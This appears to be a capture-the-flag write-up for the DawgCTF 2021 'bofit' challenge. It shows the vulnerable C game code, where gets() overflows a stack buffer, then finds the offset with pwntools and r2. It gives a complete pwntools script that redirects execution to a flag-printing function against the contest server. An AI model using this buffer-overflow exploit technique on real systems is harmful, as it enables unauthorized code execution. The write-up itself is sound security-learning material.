
The game random generates an action amond *BOF*, *pull*, *twist* and *shout*. The first three actions use *getchar* to take user input, whilst the last one uses *gets* without limitation, so it read until '\0'. To win overflow *input*, then get to target *win_game*, which prints *flat.txt*.

```c
void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}

int play_game(){
	CHAR C;
	char input[20];
	int choice;
	bool correct = true;
	int score = 0;
	srand(time(0));
	while(correct){
		choice = rand() % 4;
		switch(choice){
			case 0:
				printf("BOF it!\n");
				c = getchar();
				if(c != 'B') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 1:
				printf("Pull it!\n");
				c = getchar();
				if(c != 'P') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 2:
				printf("Twist it!\n");
				c = getchar();
				if(c != 'T') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
		}
		score++;
	}
	return score;
}
```

The padding can be found with *pwn.cyclic*, debug it with *r2*, input a 60 bytes cyclic string to overflow *input*, search address in *rip* with *pwn.cyclic_find* to get padding, which was 56 in this case. Tested several times the overflow happened at the next non-shout action after *shout*.

```bash
[0x7f5f8217b110]> dc
Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes
You'll have a second to respond to a series of commands
BOF it: Reply with a capital 'B'
Pull it: Reply with a capital 'P'
Twist it: Reply with a capital 'T'
Shout it: Reply with a string of at least 10 characters
BOF it to start!
BOF
Shout it!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Twist it!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
[+] SIGNAL 11 errno=0 addr=0x6161616f code=1 si_pid=1633771887 ret=0
```

```python
>>> pwn.cyclic(60)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa'
>>> pwn.cyclic_find(0x6161616f)
56
```

Exploited as follow.

```
def exploit(remote):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        elf = pwn.ELF(target)
        print('win_game @', hex(elf.sym['win_game']))
        pr.sendlineafter('BOF it to start!\n', 'BOF')

        payload = b'A'*56
        payload += pwn.p64(elf.sym['win_game'])
        shouted = False
        print(payload)

        while True:
            cmd = pr.readline()
            print(cmd)
            if b"Twist" in cmd:
                if shouted:
                    pr.send(payload)
                    pr.sendline()
                    print(pr.readall(2))
                else:
                    pr.sendline('T')
            elif b"Pull" in cmd:
                if shouted:
                    pr.send(payload)
                    pr.sendline()
                    print(pr.readall(2))
                else:
                    pr.sendline('P')
            elif b"BOF" in cmd:
                if shouted:
                    pr.send(payload)
                    pr.sendline()
                    print(pr.readall(2))
                else:
                    pr.sendline('B')
            elif b"Shout" in cmd:
                pr.send(payload)
                pr.sendline()
                shouted = True
    finally:
        pr.close()
exploit(True)
```

```bash
$ py3 explit.py                                                      
[+] Opening connection to umbccd.io on port 4100: Done                                                                                                                  
[*] '/home/zex/lab_ex/hacking-lab/dawgctf-2021/bofit/bofit'
    Arch:     amd64-64-little                                                                                                                                           
    RELRO:    Partial RELRO                                                         
    Stack:    No canary found                                                                                                                                           
    NX:       NX disabled                                                           
    PIE:      No PIE (0x400000)                                                                                                                                         
    RWX:      Has RWX segments
win_game @ 0x401256
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV\x12@\x00\x00\x00\x00\x00'
b'BOF it!\n'             
b'Shout it!\n'                
b'Shout it!\n'    
b'Twist it!\n'
[+] Receiving all data: Done (26B)
[*] Closed connection to umbccd.io port 4100
b'DawgCTF{n3w_h1gh_sc0r3!!}\n'
Traceback (most recent call last):
```
